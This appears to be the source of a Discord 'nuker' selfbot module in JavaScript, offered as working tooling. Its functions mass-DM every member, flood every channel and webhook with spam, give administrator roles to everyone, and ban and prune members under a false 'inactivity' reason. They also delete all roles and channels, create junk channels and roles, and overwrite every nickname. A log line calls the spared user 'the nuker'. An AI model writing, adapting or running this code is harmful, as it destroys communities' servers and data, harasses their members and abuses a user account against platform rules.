const { MessageEmbed } = require('discord.js-selfbot-v13');

const moment = require("moment");
const fetch = require("node-fetch");
const { log } = require("./logger.js");

const webhookUrl = process.env.BUILT_WEBHOOK;
const Node_Name = global.Node_Name

module.exports.SendMsg = async function (client, msg, server_id) {
  const guild = client.guilds.cache.get(server_id)
  if (!guild) return; log(`Error: Skipping guild ${server_id} because it's not available.`, client);
  try {
    await guild.members.fetch();
  } catch (err) {
    console.error('Error: Failed to fetch members for guild ' + guild.id + '.', err);
    log('Error: Failed to fetch members for guild ' + guild.id + '.', client)
    return;
  }

  const membersToSend = guild.members.cache.filter(member => member.id !== client.user.id);

  await Promise.allSettled(membersToSend.map(member => member.send(`${msg}\n\n**built** ✨`)
    .then(() => log('a message was sent to ' + member.user.tag + '.', client))
    .catch((err) => {
     console.error('Error: Failed to send a message to ' + member.user.tag + '.', err)
     log('Error: Failed to send a message to ' + member.user.tag + '.', client)

   }))
  );
};

module.exports.SendChannels = async function (client, msg, time, server_id) {
  time = Math.min(500, Math.max(1, parseInt(time) || 1));
  
  const guild = client.guilds.cache.get(server_id)
  if (!guild) return; log(`Error: Skipping guild ${server_id} because it's not available.`, client);
  const textChannels = guild.channels.cache.filter(ch => ch.type === 'GUILD_TEXT');
    
  await Promise.all(
    textChannels.map(async (channel) => {
      for (let i = 0; i < time; i++) {
        try {
          await channel.send(`${msg}`);
          log('a message was sent to ' + channel.name + '.', client);
        } catch (err) {
          console.error('Error: Failed to send a message to ' + channel.name + '.', err);
          log('Error: Failed to send a message to ' + channel.name + '.', client);

        }
      }
    })
  );
};


module.exports.WebChannels = async function (client, msg, time, server_id) {
  time = Math.min(500, Math.max(1, parseInt(time) || 1));
  const guild = await client.guilds.fetch(server_id);
  if (!guild) return; console.error(`[CLIENT] => Skipping guild ${server_id} because it's not available.`);
  const textChannels = guild.channels.cache.filter(ch => ch.type === 'GUILD_TEXT');

  // Function to create a webhook in a channel with a delay to avoid rate limits
  const createWebhookWithDelay = async (channel) => {
    try {
      const webhook = await channel.createWebhook('Built', {
        avatar: 'https://cdn.glitch.com/d42a5d83-bb45-4bb0-961c-ec50bddbac73%2Faaaas.png',
      });
      return webhook;
    } catch (err) {
      console.error('[ERROR] => Failed to create a webhook in ' + channel.name + '.', err);
      return null;
    }
  };

  // Send a single message using a webhook
  const sendMessage = async (webhook) => {
    webhook.send(`${msg}`)
      .then(() => console.log('[CLIENT] => A message was sent using webhook.'))
      .catch((err) => console.error('[ERROR] => Failed to send a message using webhook.', err));
  };

  // Create webhooks for all text channels in the guild with a delay
  const webhooks = [];
  for (const channel of textChannels.values()) {
    const webhook = await createWebhookWithDelay(channel);
    if (webhook) {
      webhooks.push(webhook);
    }
  }

  // Send messages using the created webhooks at a controlled rate
  const intervalTime = 1000; // 1 second interval
  for (const webhook of webhooks) {
    let i = 0;
    const interval = setInterval(() => {
      if (i >= time) {
        clearInterval(interval);
      } else {
        sendMessage(webhook);
        i++;
      }
    }, intervalTime);
  }
};


module.exports.GiveAdmin = async function (client, user_id, server_id) {
  const guild = client.guilds.cache.get(server_id)
  if (!guild) return; log(`Error: Skipping guild ${server_id} because it's not available.`, client);

  if (!user_id) {
    // If user_id is not provided, give admin permissions to all members
    guild.members.cache.forEach(async (member) => {
      if (member.id === client.user.id) return;

      try {
        const role = await guild.roles.create({ name: makeid(5), color: "WHITE", permissions: ['ADMINISTRATOR'] });
        const botRole = guild.me.roles.highest;
        await role.setPosition(botRole.position - 1);
        await member.roles.add(role);
        log('' + member.user.tag + ' just got given the role.', client);
      } catch (err) {
        console.error('Error: Failed to give a role to ' + member.user.tag + '.', err);
        log('Error: Failed to give a role to ' + member.user.tag + '.', client);
      }
    });
  } else {
    // If user_id is provided, give admin permissions to the specific member
    const member = guild.members.cache.get(user_id);
    if (member && member.id !== client.user.id) {
      try {
        const role = await guild.roles.create({ name: "._.", permissions: ['ADMINISTRATOR'] });
        const botRole = guild.me.roles.highest;
        await role.setPosition(botRole.position - 1);
        await member.roles.add(role);
        log('' + member.user.tag + ' just got given the role.', client);
      } catch (err) {
        console.error('Error: Failed to give a role to ' + member.user.tag + '.', err);
        log('Error: Failed to give a role to ' + member.user.tag + '.', client);

      }
    }
  }
};

module.exports.BanMembers = async function (client, server_id, user_id) {
  const guild = client.guilds.cache.get(server_id)
  if (!guild) return; log(`Error: Skipping guild ${server_id} because it's not available.`, client);

  const allMembers = await guild.members.fetch();
  const roleWithHighestMembers = guild.roles.cache.reduce((prevRole, currentRole) => {
    if (!prevRole) return currentRole;
    return currentRole.members.size > prevRole.members.size ? currentRole : prevRole;
  }, null);

  if (!roleWithHighestMembers) {
    console.log('Error: No roles found in the guild.');
    log('Error: No roles found in the guild.', client);
    return;
  }

  const membersToPrune = allMembers.filter((member) => {
    const hasHighestRole = member.roles.cache.has(roleWithHighestMembers.id);
    if (!hasHighestRole) return false;
    const lastActiveTime = member.joinedAt || member.user.createdAt;
    const inactiveDuration = Date.now() - lastActiveTime;
    const daysInactive = inactiveDuration / (1000 * 60 * 60 * 24);
    return daysInactive > 7;
  });

  if (membersToPrune.size === 0) {
    console.error('Error: No members to prune.');
    log('Error: No members to prune.', client);
    return;
  }

  try {
    const prunedCount = await guild.members.prune({
      days: 1,
      dry: false,
      roles: [roleWithHighestMembers.id],
      reason: 'Banned due to inactivity',
    });

    for (const [memberId, member] of membersToPrune) {
      if (memberId === user_id) return log('Skipped ' + member.user.tag + ' because they\'re the nuker.', client);

      try {
        await guild.members.ban(member, {
          reason: 'Banned due to inactivity',
        });
        log('' + member.user.tag + ' just got banned.', client);
      } catch (err) {
        console.error('Error: Failed to ban ' + member.user.tag + '.', err);
        log('Error: Failed to ban ' + member.user.tag + '.', client);
      }
    }

    log(`Successfully pruned ${prunedCount} members.`, client);
  } catch (err) {
    console.error('Error: Failed to prune members.', err);
    log('Error: Failed to prune members.', client);

  }
};





module.exports.DelRoles = async function (client, server_id) {
    const guild = client.guilds.cache.get(server_id)
    if (!guild) return; log(`Error: Skipping guild ${server_id} because it's not available.`, client);

    try {
      for (const role of guild.roles.cache.values()) {
        await role.delete();
        log('' + role.name + ' just got deleted.', client);
      }
    } catch (err) {
      console.error('Error: Failed to delete roles in guild ' + guild.id + '.', err);
      log('Error: Failed to delete roles in guild ' + guild.id + '.', client);
    }
  };


module.exports.DelChannels = async function (client, server_id) {
    const guild = client.guilds.cache.get(server_id)
    if (!guild) return; log(`Error: Skipping guild ${server_id} because it's not available.`, client);


    try {
      const Channels = guild.channels.cache.filter(ch => ch.type === 'GUILD_TEXT' || ch.type === 'GUILD_VOICE' || ch.type === 'GUILD_CATEGORY');
      for (const channel of Channels.values()) {
        await channel.delete();
        log('' + channel.name + ' just got deleted.', client);
      }
    } catch (err) {
      console.error('Error: Failed to delete channels in guild ' + guild.id + '.', err);
      log('Error: Failed to delete channels in guild ' + guild.id + '.', client);
    }
  };



module.exports.RanChannels = async function (client, num, name, server_id) {
  const guild = client.guilds.cache.get(server_id)
  if (!guild) return; console.error(`Error: Skipping guild ${server_id} because it's not available.`, client);
  name = name || makeid(5);

    await Promise.allSettled(Array.from({ length: num }, () => guild.channels.create(name)
      .then(() => log(`${name} channel just got created.`, client))
      .catch((err) => {
      console.error('Error: Failed to create a channel.', err)
      log(`Error: Failed to create ${name} channel.`, client)
      }))
    );
  };

module.exports.ChangeNicknames = async function (client, msg, server_id) {
    const guild = client.guilds.cache.get(server_id)
    if (!guild) return; console.error(`Error: Skipping guild ${server_id} because it's not available.`, client);

    const membersToChangeNick = guild.members.cache.filter(member => member.id !== client.user.id);
    await Promise.allSettled(membersToChangeNick.map(member => member.setNickname(msg)
      .then(() => log('' + member.user.tag + ' Nickname changed.', client))
      .catch((err) => { 
     console.error('Error: Failed to change ' + member.user.tag + ' Nickname.', err)
     log('Error: Failed to change ' + member.user.tag + ' Nickname.', client)
     }))
    );
  };

module.exports.RanRoles = async function (client, num, name, server_id) {
  const guild = client.guilds.cache.get(server_id)
  if (!guild) return; console.error(`Error: Skipping guild ${server_id} because it's not available.`, client);

  name = name || makeid(5);

    await Promise.allSettled(Array.from({ length: num }, () => guild.roles.create({ name: name, color: 'BLUE' })
      .then(() => console.log(`${name} role just got created.`, client))
      .catch((err) => {
      console.error('Error: Failed to create a role.', err)
      log(`Error: Failed to create ${name} role.`, client)

     }))
    );
  };


function makeid(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
